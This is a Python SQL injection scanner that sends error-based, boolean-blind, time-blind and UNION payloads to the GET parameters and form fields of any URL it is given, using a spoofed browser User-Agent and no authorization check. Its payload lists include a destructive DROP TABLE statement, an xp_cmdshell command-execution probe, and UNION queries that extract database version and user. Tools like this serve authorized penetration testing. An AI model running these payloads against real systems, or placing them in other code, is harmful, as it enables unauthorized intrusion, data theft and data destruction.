
from __future__ import annotations

import statistics
import sys
import time
import hashlib
import difflib
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

# ── Payloads ─────────────────────────────────────────────────────────────────

ERROR_PAYLOADS: list[str] = [
    "'",
    "''",
    "`",
    '"',
    "' OR '1'='1",
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR 'x'='x",
    "') OR ('1'='1",
    "'; DROP TABLE users; --",
    "' AND 1=CONVERT(int,@@version) --",   # MSSQL specific
    "' AND extractvalue(1,concat(0x7e,version())) --",  # MySQL error extraction
]

BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("' AND 1=1 --",  "' AND 1=2 --"),
    (" AND 1=1",      " AND 1=2"),
    ("' AND 'a'='a",  "' AND 'a'='b"),
    ("') AND ('1'='1","') AND ('1'='2"),
    (" OR 1=1 --",    " OR 1=2 --"),
]

TIME_PAYLOADS: list[str] = [
    "'; WAITFOR DELAY '0:0:5' --",
    "'; WAITFOR DELAY '0:0:5'--",
    "' ; WAITFOR DELAY '0:0:5' --",
    "'; SELECT SLEEP(5) --",
    "' OR SLEEP(5) --",
    "' OR SLEEP(5)#",
    "'; SELECT pg_sleep(5) --",
    "1; SELECT SLEEP(5)",
    "' AND SLEEP(5) AND '1'='1",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "'; exec xp_cmdshell('ping -n 5 127.0.0.1') --",
]

UNION_PROBES: list[str] = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "' UNION ALL SELECT NULL --",
    "' UNION ALL SELECT NULL,NULL --",
    "' UNION ALL SELECT NULL,NULL,NULL --",
]

UNION_DATA_PAYLOADS: list[str] = [
    "' UNION SELECT 'sqli_test',NULL --",
    "' UNION SELECT NULL,'sqli_test' --",
    "' UNION SELECT 'sqli_test',NULL,NULL --",
    "' UNION SELECT @@version,NULL --",
    "' UNION SELECT user(),NULL --",
    "' UNION SELECT database(),NULL --",
]

UNION_MARKER = "sqli_test"

ERROR_SIGNATURES: list[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    "mysql_num_rows",
    "mysql_query",
    # MSSQL / ASP / OLE DB  ← testasp.vulnweb.com uses these
    "microsoft ole db provider for sql server",
    "[microsoft][odbc sql server driver]",
    "odbc sql server driver",
    "odbc microsoft access",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "conversion failed when converting",
    "invalid use of null",
    "80040e14",          # OLE DB SQL parse error HRESULT
    "80040e07",          # OLE DB type mismatch HRESULT
    "80040e10",          # OLE DB param missing
    "adodb.field",       # Classic ASP ADODB error
    "adodb.command",
    "adodb.recordset",
    "bof or eof",        # Classic ASP recordset exhausted
    "type mismatch",     # VBScript/ASP type error on bad input
    "microsoft vbscript runtime",
    "error '8004",       # Generic OLE DB HRESULT prefix
    "mssql",
    # Oracle
    "ora-",
    "oracle error",
    "oracle driver",
    # PostgreSQL
    "postgresql error",
    "pg::syntaxerror",
    "org.postgresql.util.psqlexception",
    # SQLite
    "sqlite_error",
    "sqlite3::operationalerror",
    # General / Java
    "sqlstate",
    "syntax error",
    "dynamic sql error",
    "sql command not properly ended",
    "unexpected end of sql command",
    "java.sql.sqlexception",
    "com.mysql.jdbc.exceptions",
    "db2 sql error",
    "sqlexception",
]

WAF_SIGNATURES: list[str] = [
    "access denied",
    "forbidden",
    "not acceptable",
    "request blocked",
    "security violation",
    "attack detected",
    "mod_security",
    "web application firewall",
    "waf",
    "cloudflare",
    "incapsula",
    "akamai",
    "you have been blocked",
    "your ip has been blocked",
]

# ── Data structures ───────────────────────────────────────────────────────────

@dataclass
class Finding:
    vuln_type: str          # "Error-Based", "Boolean-Based Blind", "Time-Based Blind", "UNION-Based"
    endpoint: str
    parameter: str
    payload: str
    evidence: str
    confidence: int         # 0–100
    severity: str           # "CRITICAL" / "HIGH" / "MEDIUM" / "LOW" / "INFO"
    method: str = "GET"
    response_snippet: str = ""
    signals: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "type":             f"{self.vuln_type} SQL Injection",
            "severity":         self.severity,
            "confidence":       self.confidence,
            "url":              self.endpoint,
            "parameter":        self.parameter,
            "payload":          self.payload,
            "method":           self.method,
            "description":      self.evidence,
            "response_snippet": self.response_snippet[:300] if self.response_snippet else "",
            "signals":          self.signals,
        }

    def __str__(self) -> str:
        return (
            f"[{self.severity}] {self.vuln_type} SQLi — "
            f"param={self.parameter!r}  confidence={self.confidence}%\n"
            f"  payload : {self.payload!r}\n"
            f"  evidence: {self.evidence}\n"
            f"  signals : {', '.join(self.signals)}"
        )


def _severity_from_confidence(confidence: int) -> str:
    if confidence >= 85:
        return "CRITICAL"
    if confidence >= 65:
        return "HIGH"
    if confidence >= 40:
        return "MEDIUM"
    if confidence >= 20:
        return "LOW"
    return "INFO"


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _get_params(url: str):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params


def _build_url(parsed, params: dict) -> str:
    query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=query))


def _fetch(session: requests.Session, url: str, timeout: int = 12) -> tuple[Optional[str], Optional[int], Optional[float]]:
    """Return (body_lower, status_code, elapsed_seconds) or (None, None, None)."""
    try:
        r = session.get(url, timeout=timeout, allow_redirects=True)
        return r.text.lower(), r.status_code, r.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        return None, None, None


def _is_waf_block(text: Optional[str], status: Optional[int]) -> bool:
    if status in (403, 406, 429, 503):
        return True
    if text:
        return any(sig in text for sig in WAF_SIGNATURES)
    return False


def _is_rate_limited(statuses: list[int]) -> bool:
    return statuses.count(429) > 0 or statuses.count(503) >= 2


def _similarity(a: str, b: str) -> float:
    """SequenceMatcher ratio between two strings (0.0–1.0)."""
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:5000], b[:5000]).ratio()


def _has_sql_error(text: Optional[str]) -> tuple[bool, str]:
    """Returns (found, matched_signature)."""
    if not text:
        return False, ""
    for sig in ERROR_SIGNATURES:
        if sig in text:
            return True, sig
    return False, ""


# ── Baseline measurement ──────────────────────────────────────────────────────

def _measure_baseline(session: requests.Session, url: str, n: int = 3) -> dict:
    """Fetch n times and return stats dict."""
    texts, statuses, times = [], [], []
    for _ in range(n):
        t, s, e = _fetch(session, url)
        if t is not None:
            texts.append(t)
            statuses.append(s)
            times.append(e)
        time.sleep(0.1)

    if not texts:
        return {"texts": [], "lengths": [], "median_len": 0,
                "time_median": 0.0, "time_stddev": 0.0, "hash_set": set()}

    lengths = [len(t) for t in texts]
    hashes = {hashlib.md5(t.encode()).hexdigest() for t in texts}

    time_median = statistics.median(times) if times else 0.0
    time_stddev = statistics.stdev(times) if len(times) >= 2 else 0.0

    return {
        "texts": texts,
        "lengths": lengths,
        "median_len": statistics.median(lengths),
        "time_median": time_median,
        "time_stddev": time_stddev,
        "hash_set": hashes,
        "statuses": statuses,
    }


# ── Detection modules ─────────────────────────────────────────────────────────

def test_error_based(
    session: requests.Session,
    parsed,
    params: dict,
    baseline: dict,
    findings: list[Finding],
) -> None:
    """
    Module 1 — Error-Based SQL Injection.
    Injects error-triggering payloads and checks for SQL error strings in response.
    Each parameter is tested independently; all confirmed findings are recorded.
    """
    statuses_seen = []

    for param in params:
        original = params[param][0]
        param_findings: list[Finding] = []
        waf_blocked_count = 0

        for payload in ERROR_PAYLOADS:
            modified = dict(params)
            modified[param] = [original + payload]
            test_url = _build_url(parsed, modified)

            text, status, elapsed = _fetch(session, test_url)
            if status:
                statuses_seen.append(status)

            if _is_waf_block(text, status):
                waf_blocked_count += 1
                continue

            found, matched_sig = _has_sql_error(text)
            if not found:
                continue

            # Verify baseline did NOT already contain this error (avoid FP)
            baseline_has_error = any(_has_sql_error(bt)[0] for bt in baseline.get("texts", []))
            if baseline_has_error:
                continue

            # Extract a small snippet around the error for evidence
            snippet = ""
            if text:
                idx = text.find(matched_sig)
                snippet = text[max(0, idx-60): idx+120].strip()

            signals = [f"SQL error signature: '{matched_sig}'"]
            if waf_blocked_count:
                signals.append(f"WAF blocked {waf_blocked_count} prior requests")

            confidence = 90  # Error-based is highly reliable when genuine
            if waf_blocked_count >= 2:
                confidence -= 10  # partial WAF = slightly less reliable

            f = Finding(
                vuln_type="Error-Based",
                endpoint=_build_url(parsed, params),
                parameter=param,
                payload=payload,
                evidence=f"SQL error '{matched_sig}' in response body",
                confidence=confidence,
                severity=_severity_from_confidence(confidence),
                response_snippet=snippet,
                signals=signals,
            )
            param_findings.append(f)
            break  # One confirmed error per param is enough

        # Check for rate limiting across all params
        if _is_rate_limited(statuses_seen):
            print(f"  [!] Rate limiting detected on {parsed.netloc} — error-based scan may be incomplete")

        findings.extend(param_findings)


def test_boolean_based(
    session: requests.Session,
    parsed,
    params: dict,
    baseline: dict,
    findings: list[Finding],
) -> None:
    """
    Module 2 — Boolean-Based Blind SQL Injection.
    Uses content similarity (difflib) + length delta + hash comparison.
    All parameters and all payload pairs are tested independently.
    """
    if not baseline.get("texts"):
        return

    baseline_text = baseline["texts"][0]
    baseline_len  = baseline["median_len"]
    # Natural variance threshold: 5× stdev of baseline lengths, min 200 chars
    len_variance  = statistics.stdev(baseline["lengths"]) if len(baseline["lengths"]) >= 2 else 0
    len_threshold = max(200, len_variance * 5)

    for param in params:
        original = params[param][0]

        for true_payload, false_payload in BOOLEAN_PAIRS:
            mod_true  = dict(params); mod_true[param]  = [original + true_payload]
            mod_false = dict(params); mod_false[param] = [original + false_payload]

            text_true,  st_true,  _ = _fetch(session, _build_url(parsed, mod_true))
            text_false, st_false, _ = _fetch(session, _build_url(parsed, mod_false))

            if text_true is None or text_false is None:
                continue
            if _is_waf_block(text_true, st_true) or _is_waf_block(text_false, st_false):
                continue

            len_true  = len(text_true)
            len_false = len(text_false)
            len_diff  = abs(len_true - len_false)

            # Similarity between true and false responses (low = very different)
            sim_tf = _similarity(text_true, text_false)
            # Similarity of true vs baseline (should be high if true condition works)
            sim_tb = _similarity(text_true, baseline_text)
            # Similarity of false vs baseline (should be lower)
            sim_fb = _similarity(text_false, baseline_text)

            signals: list[str] = []
            score = 0

            # Signal 1: large length difference
            if len_diff > len_threshold:
                signals.append(f"Length delta {len_diff} chars (threshold {len_threshold:.0f})")
                score += 30

            # Signal 2: low similarity between true/false
            if sim_tf < 0.75:
                signals.append(f"True/False similarity {sim_tf:.2f} < 0.75")
                score += 25

            # Signal 3: true response closer to baseline than false response
            if sim_tb > sim_fb + 0.10:
                signals.append(f"True↔baseline sim {sim_tb:.2f} > False↔baseline {sim_fb:.2f}")
                score += 25

            # Signal 4: hash uniqueness (false response hash not in baseline hashes)
            false_hash = hashlib.md5(text_false.encode()).hexdigest()
            if false_hash not in baseline.get("hash_set", set()):
                signals.append("False-condition response differs from all baseline hashes")
                score += 20

            if score < 40:
                continue  # Not enough signals

            confidence = min(score, 85)  # Boolean-based caps at 85 (blind = less certain)
            f = Finding(
                vuln_type="Boolean-Based Blind",
                endpoint=_build_url(parsed, params),
                parameter=param,
                payload=f"TRUE: {true_payload}  /  FALSE: {false_payload}",
                evidence=f"Distinct responses for true vs false conditions ({len(signals)} signals)",
                confidence=confidence,
                severity=_severity_from_confidence(confidence),
                signals=signals,
            )
            findings.append(f)
            # Continue testing other payload pairs for this param (no break)


def test_time_based(
    session: requests.Session,
    parsed,
    params: dict,
    baseline: dict,
    findings: list[Finding],
    repeat: int = 4,
) -> None:
    """
    Module 3 — Time-Based Blind SQL Injection.
    Each payload is sent repeat times; a finding is only reported when
    the majority of runs show a delay >= adaptive_threshold.
    WAF blocks and unstable baselines are handled gracefully.
    """
    baseline_median = baseline.get("time_median", 0.0)
    baseline_stddev = baseline.get("time_stddev", 0.0)

    # Adaptive threshold: 4× median or baseline+4σ, minimum 5s
    adaptive_threshold = max(
        baseline_median * 4.0,
        baseline_median + (baseline_stddev * 4),
        5.0,
    )

    # If baseline itself is already slow, skip (avoid FP on slow servers)
    if baseline_median > 4.0:
        print(f"  [!] Baseline response time {baseline_median:.1f}s is too slow — skipping time-based tests")
        return

    for param in params:
        original = params[param][0]

        for payload in TIME_PAYLOADS:
            modified = dict(params)
            modified[param] = [original + payload]
            test_url = _build_url(parsed, modified)

            elapsed_times: list[float] = []
            waf_count = 0

            for _ in range(repeat):
                text, status, elapsed = _fetch(session, test_url, timeout=20)

                if _is_waf_block(text, status):
                    waf_count += 1
                    continue

                if elapsed is not None:
                    elapsed_times.append(elapsed)

                time.sleep(0.3)  # small gap between repeat requests

            if not elapsed_times:
                continue

            # Require majority (> 50%) of runs to show the delay
            delayed_runs = [e for e in elapsed_times if e >= adaptive_threshold]
            hit_ratio = len(delayed_runs) / len(elapsed_times)

            if hit_ratio < 0.5:
                continue

            median_elapsed = statistics.median(elapsed_times)
            signals = [
                f"{len(delayed_runs)}/{len(elapsed_times)} runs exceeded threshold {adaptive_threshold:.1f}s",
                f"Median delayed time: {median_elapsed:.2f}s vs baseline {baseline_median:.2f}s",
            ]
            if waf_count:
                signals.append(f"WAF blocked {waf_count} of {repeat} attempts")

            # Confidence: scales with hit_ratio and magnitude
            magnitude_ratio = median_elapsed / max(adaptive_threshold, 1)
            confidence = int(min(50 * hit_ratio + 20 * min(magnitude_ratio, 2), 90))

            f = Finding(
                vuln_type="Time-Based Blind",
                endpoint=_build_url(parsed, params),
                parameter=param,
                payload=payload,
                evidence=(
                    f"Consistent delay {median_elapsed:.2f}s detected "
                    f"({len(delayed_runs)}/{len(elapsed_times)} runs, "
                    f"threshold {adaptive_threshold:.1f}s)"
                ),
                confidence=confidence,
                severity=_severity_from_confidence(confidence),
                signals=signals,
            )
            findings.append(f)
            # Continue testing other payloads (no early exit)


def test_union_based(
    session: requests.Session,
    parsed,
    params: dict,
    baseline: dict,
    findings: list[Finding],
) -> None:
    """
    Module 4 — UNION-Based SQL Injection.
    First probes for correct column count (NULL padding), then attempts
    to reflect a string marker to confirm data extraction is possible.
    All parameters are tested independently.
    """
    if not baseline.get("texts"):
        return

    baseline_text = baseline["texts"][0]

    for param in params:
        original = params[param][0]

        # Step 1: find a working column count via NULL probes
        working_column_count = None
        working_probe_url = None

        for probe in UNION_PROBES:
            modified = dict(params)
            modified[param] = [original + probe]
            test_url = _build_url(parsed, modified)

            text, status, _ = _fetch(session, test_url)
            if text is None or _is_waf_block(text, status):
                continue

            error_found, _ = _has_sql_error(text)
            sim = _similarity(text, baseline_text)

            # A successful UNION probe reduces errors and changes content
            if not error_found and sim < 0.90:
                null_count = probe.lower().count("null")
                working_column_count = null_count
                working_probe_url = test_url
                break  # found a working column count

        if working_column_count is None:
            continue  # Couldn't find a working column count for this param

        # Step 2: try to reflect data marker with the known column count
        confirmed = False
        confirmed_payload = None
        confirmed_snippet = ""

        for data_payload in UNION_DATA_PAYLOADS:
            # Only try payloads that match our column count
            null_count = data_payload.lower().count("null") + data_payload.lower().count("'sqli_test'") + data_payload.lower().count("@@version") + data_payload.lower().count("user()") + data_payload.lower().count("database()")
            modified = dict(params)
            modified[param] = [original + data_payload]
            test_url = _build_url(parsed, modified)

            text, status, _ = _fetch(session, test_url)
            if text is None or _is_waf_block(text, status):
                continue

            if UNION_MARKER in text:
                confirmed = True
                confirmed_payload = data_payload
                idx = text.find(UNION_MARKER)
                confirmed_snippet = text[max(0, idx-40): idx+80].strip()
                break

            # Also check if @@version or other DB data might have reflected
            # (heuristic: response is different from baseline and error-free)
            error_found, _ = _has_sql_error(text)
            if not error_found and _similarity(text, baseline_text) < 0.80:
                confirmed_payload = data_payload
                confirmed_snippet = text[:200]

        if not (confirmed or confirmed_payload):
            continue

        confidence = 95 if confirmed else 65
        signals = [f"Working UNION column count: {working_column_count}"]
        if confirmed:
            signals.append(f"String marker '{UNION_MARKER}' reflected in response")
        else:
            signals.append("Response changed significantly after UNION probe (no marker confirmed)")

        f = Finding(
            vuln_type="UNION-Based",
            endpoint=_build_url(parsed, params),
            parameter=param,
            payload=confirmed_payload or f"(column probe: {working_column_count} cols)",
            evidence=(
                f"UNION SELECT with {working_column_count} columns accepted by server"
                + ("; data marker reflected" if confirmed else "")
            ),
            confidence=confidence,
            severity=_severity_from_confidence(confidence),
            response_snippet=confirmed_snippet,
            signals=signals,
        )
        findings.append(f)


# ── Form parameter extraction ─────────────────────────────────────────────────

def _resolve_url(base: str, action: str) -> str:
    """
    Resolve a form action relative to the page URL.
    Handles: absolute URLs, root-relative (/path), relative (path), and
    preserves the query string in the action if present.
    """
    if not action:
        return base
    if action.startswith("http://") or action.startswith("https://"):
        return action
    parsed_base = urlparse(base)
    if action.startswith("/"):
        # Root-relative: keep scheme+host, replace path+query
        return urlunparse(parsed_base._replace(path=action.split("?")[0],
                                               query=action.split("?")[1] if "?" in action else ""))
    # Relative: join with directory of base path
    base_dir = "/".join(parsed_base.path.split("/")[:-1]) + "/"
    full_path = base_dir + action.split("?")[0]
    query = action.split("?")[1] if "?" in action else ""
    return urlunparse(parsed_base._replace(path=full_path, query=query))


def _extract_form_params(session: requests.Session, url: str) -> list[dict]:
    """
    Fetch page and extract HTML form action+inputs so POST forms can be tested.
    - Correctly reconstructs absolute action URLs (fixes root-relative /path?query)
    - Includes hidden fields (they carry CSRF tokens / state needed for valid POST)
    - Marks which fields are injectable (not submit/image/button types)
    Returns list of {"action": url, "method": str, "params": {field: value},
                      "injectable": [field_names]} dicts.
    """
    try:
        from html.parser import HTMLParser

        NON_INJECTABLE = {"submit", "button", "image", "reset", "file"}

        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.forms: list[dict] = []
                self._current: Optional[dict] = None

            def handle_starttag(self, tag, attrs):
                a = dict(attrs)
                tag = tag.lower()
                if tag == "form":
                    self._current = {
                        "action": a.get("action", ""),
                        "method": a.get("method", "get").lower(),
                        "inputs": {},
                        "injectable": [],
                    }
                    self.forms.append(self._current)
                elif tag == "input" and self._current:
                    name = a.get("name", "")
                    itype = a.get("type", "text").lower()
                    if name:
                        # Include ALL named fields (hidden fields needed for valid POST)
                        self._current["inputs"][name] = a.get("value", "") or "test"
                        # Mark text/password/search fields as injectable targets
                        if itype not in NON_INJECTABLE:
                            self._current["injectable"].append(name)
                elif tag == "textarea" and self._current:
                    name = a.get("name", "")
                    if name:
                        self._current["inputs"][name] = "test"
                        self._current["injectable"].append(name)
                elif tag == "select" and self._current:
                    name = a.get("name", "")
                    if name:
                        self._current["inputs"][name] = "1"
                        self._current["injectable"].append(name)

            def handle_endtag(self, tag):
                if tag.lower() == "form":
                    self._current = None

        r = session.get(url, timeout=12, allow_redirects=True)
        p = FormParser()
        p.feed(r.text)

        results = []
        for form in p.forms:
            action = _resolve_url(url, form["action"])
            results.append({
                "action":     action,
                "method":     form["method"],
                "params":     form["inputs"],
                "injectable": form["injectable"],
            })
        return results
    except Exception as e:
        print(f"  [!] Form extraction error: {e}")
        return []


# ── POST parameter testing ────────────────────────────────────────────────────

def _test_post_params(
    session: requests.Session,
    url: str,
    post_data: dict,
    injectable_fields: list[str],
    findings: list[Finding],
) -> None:
    """
    Run all SQLi detection modules on POST form parameters.
    - Uses the FULL ERROR_PAYLOADS list (no slice)
    - Sends correct Content-Type header (required by some ASP servers)
    - Only injects into fields marked injectable; hidden/static fields kept intact
    - Captures baseline POST response for boolean comparison
    - Runs error-based, boolean-based, and time-based detection on POST params
    """
    if not injectable_fields:
        return

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    # Establish POST baseline with clean data
    try:
        r0 = session.post(url, data=post_data, headers=headers, timeout=12, allow_redirects=True)
        baseline_text = r0.text.lower()
        baseline_len  = len(baseline_text)
        baseline_time = r0.elapsed.total_seconds()
    except Exception:
        baseline_text = ""
        baseline_len  = 0
        baseline_time = 1.0

    adaptive_time_threshold = max(baseline_time * 4.0, 5.0)

    for param in injectable_fields:
        if param not in post_data:
            continue
        original_val = post_data[param]

        # ── Error-based ───────────────────────────────────────────────────
        for payload in ERROR_PAYLOADS:
            modified = dict(post_data)
            modified[param] = original_val + payload
            try:
                r = session.post(url, data=modified, headers=headers, timeout=12, allow_redirects=True)
                text   = r.text.lower()
                status = r.status_code
                elapsed = r.elapsed.total_seconds()
            except requests.exceptions.RequestException:
                continue

            if _is_waf_block(text, status):
                continue

            found, sig = _has_sql_error(text)
            if found:
                # Make sure baseline didn't already contain this error
                if sig in baseline_text:
                    continue
                idx = text.find(sig)
                snippet = text[max(0, idx - 80): idx + 200].strip()
                findings.append(Finding(
                    vuln_type="Error-Based",
                    endpoint=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"SQL error signature '{sig}' in POST response",
                    confidence=92,
                    severity="CRITICAL",
                    method="POST",
                    response_snippet=snippet,
                    signals=[
                        f"POST param: {param!r}",
                        f"SQL error matched: '{sig}'",
                        f"Response length: {len(text)} chars",
                    ],
                ))
                break  # One confirmed error per param; move to next param

        # ── Boolean-based (POST) ──────────────────────────────────────────
        for true_pl, false_pl in BOOLEAN_PAIRS[:3]:
            mod_t = dict(post_data); mod_t[param] = original_val + true_pl
            mod_f = dict(post_data); mod_f[param] = original_val + false_pl
            try:
                rt = session.post(url, data=mod_t, headers=headers, timeout=12, allow_redirects=True)
                rf = session.post(url, data=mod_f, headers=headers, timeout=12, allow_redirects=True)
                tt, tf = rt.text.lower(), rf.text.lower()
            except Exception:
                continue

            sim_tf = _similarity(tt, tf)
            sim_tb = _similarity(tt, baseline_text)
            sim_fb = _similarity(tf, baseline_text)
            len_diff = abs(len(tt) - len(tf))
            len_threshold = max(200, baseline_len * 0.05)

            score = 0
            sigs: list[str] = []
            if len_diff > len_threshold:
                score += 30; sigs.append(f"POST length delta {len_diff}")
            if sim_tf < 0.75:
                score += 25; sigs.append(f"TRUE/FALSE similarity {sim_tf:.2f}")
            if sim_tb > sim_fb + 0.10:
                score += 25; sigs.append(f"TRUE closer to baseline ({sim_tb:.2f} vs {sim_fb:.2f})")

            if score >= 40:
                findings.append(Finding(
                    vuln_type="Boolean-Based Blind",
                    endpoint=url,
                    parameter=param,
                    payload=f"TRUE: {true_pl}  /  FALSE: {false_pl}",
                    evidence=f"POST boolean conditions produce distinct responses ({len(sigs)} signals)",
                    confidence=min(score, 80),
                    severity=_severity_from_confidence(min(score, 80)),
                    method="POST",
                    signals=sigs,
                ))
                break

        # ── Time-based (POST) ─────────────────────────────────────────────
        for tpl in TIME_PAYLOADS:
            modified = dict(post_data)
            modified[param] = original_val + tpl
            elapsed_times: list[float] = []
            for _ in range(3):
                try:
                    r = session.post(url, data=modified, headers=headers, timeout=20, allow_redirects=True)
                    elapsed_times.append(r.elapsed.total_seconds())
                except Exception:
                    pass
                time.sleep(0.2)

            if not elapsed_times:
                continue
            delayed = [e for e in elapsed_times if e >= adaptive_time_threshold]
            if len(delayed) / len(elapsed_times) >= 0.6:
                med = statistics.median(elapsed_times)
                findings.append(Finding(
                    vuln_type="Time-Based Blind",
                    endpoint=url,
                    parameter=param,
                    payload=tpl,
                    evidence=f"POST response delayed {med:.2f}s (threshold {adaptive_time_threshold:.1f}s, {len(delayed)}/{len(elapsed_times)} runs)",
                    confidence=70,
                    severity="HIGH",
                    method="POST",
                    signals=[f"Median delay {med:.2f}s", f"Baseline {baseline_time:.2f}s"],
                ))
                break


# ── Main scanner entry point ──────────────────────────────────────────────────

def scan(url: str) -> list[dict]:
    """
    Full scan: GET query params + HTML form POST params.
    All four modules run independently; no early stopping.
    Returns a list of finding dicts.
    """
    parsed, params = _get_params(url)
    all_findings: list[Finding] = []

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })

    print(f"\n[*] Target: {url}")

    # ── GET param tests ──────────────────────────────────────────────────────
    # Filter out non-injectable GET params (pure redirect params like RetURL)
    REDIRECT_PARAMS = {"returl", "redirect", "redirecturl", "return", "returnurl",
                       "next", "redir", "url", "goto", "destination", "dest"}
    injectable_get_params = {
        k: v for k, v in params.items()
        if k.lower() not in REDIRECT_PARAMS
    }

    if params:
        print(f"[*] Found {len(params)} GET parameter(s): {list(params.keys())}")
        if injectable_get_params:
            print(f"[*] Injectable GET params: {list(injectable_get_params.keys())}")
        else:
            print("[*] All GET params appear to be redirect/non-data params — skipping GET injection tests")

    if injectable_get_params:
        base_url = _build_url(parsed, params)

        print("[*] Measuring baseline (3 requests)…")
        baseline = _measure_baseline(session, base_url, n=3)

        if not baseline["texts"]:
            print("[!] Could not reach target. Aborting.")
            session.close()
            return []

        print(f"    Baseline: median_len={baseline['median_len']:.0f}  "
              f"time={baseline['time_median']:.2f}s±{baseline['time_stddev']:.2f}s")

        if any(_is_waf_block(t, s) for t, s in zip(baseline["texts"], baseline.get("statuses", []))):
            print("[!] WAF/firewall detected on baseline — results may be limited")

        print("[1/4] Error-Based testing…")
        test_error_based(session, parsed, injectable_get_params, baseline, all_findings)

        print("[2/4] Boolean-Based Blind testing…")
        test_boolean_based(session, parsed, injectable_get_params, baseline, all_findings)

        print("[3/4] Time-Based Blind testing…")
        test_time_based(session, parsed, injectable_get_params, baseline, all_findings)

        print("[4/4] UNION-Based testing…")
        test_union_based(session, parsed, injectable_get_params, baseline, all_findings)

    elif not params:
        print("[*] No GET parameters found in URL.")

    # ── Form / POST param tests ──────────────────────────────────────────────
    print("[*] Extracting HTML forms…")
    forms = _extract_form_params(session, url)
    if forms:
        print(f"[*] Found {len(forms)} form(s):")
        for form in forms:
            method = form["method"].upper()
            injectable = form.get("injectable", list(form["params"].keys()))
            print(f"    {method} → {form['action']}")
            print(f"      All fields   : {list(form['params'].keys())}")
            print(f"      Injectable   : {injectable}")

            if not form["params"]:
                continue

            if form["method"] == "post":
                _test_post_params(
                    session,
                    form["action"],
                    form["params"],
                    injectable or list(form["params"].keys()),
                    all_findings,
                )
            elif form["method"] == "get" and injectable:
                # GET form — rebuild URL with form fields and run GET tests
                action_parsed = urlparse(form["action"])
                form_params = {k: [v] for k, v in form["params"].items()}
                inj_params = {k: v for k, v in form_params.items() if k in injectable}
                if inj_params:
                    base_url = _build_url(action_parsed, form_params)
                    print(f"      Running GET form injection on {form['action']}…")
                    baseline = _measure_baseline(session, base_url, n=3)
                    if baseline["texts"]:
                        test_error_based(session, action_parsed, inj_params, baseline, all_findings)
                        test_boolean_based(session, action_parsed, inj_params, baseline, all_findings)
    else:
        print("[*] No HTML forms found.")

    session.close()

    # ── Deduplication ────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[Finding] = []
    for f in all_findings:
        key = (f.vuln_type, f.parameter, f.payload[:60])
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # ── Print summary ────────────────────────────────────────────────────────
    print(f"\n{'='*60}")
    print(f"  SCAN COMPLETE — {len(deduped)} finding(s)")
    print(f"{'='*60}")
    for f in sorted(deduped, key=lambda x: -x.confidence):
        print(f"\n{f}")
    if not deduped:
        print("  No SQL injection vulnerabilities detected.")
    print(f"{'='*60}\n")

    return [f.to_dict() for f in deduped]


# ── CLI entry point ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqli_checker.py <url>")
        print('Example: python sqli_checker.py "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F"')
        sys.exit(1)

    findings = scan(sys.argv[1])
    if findings:
        import json
        print("\n[JSON OUTPUT]")
        print(json.dumps(findings, indent=2))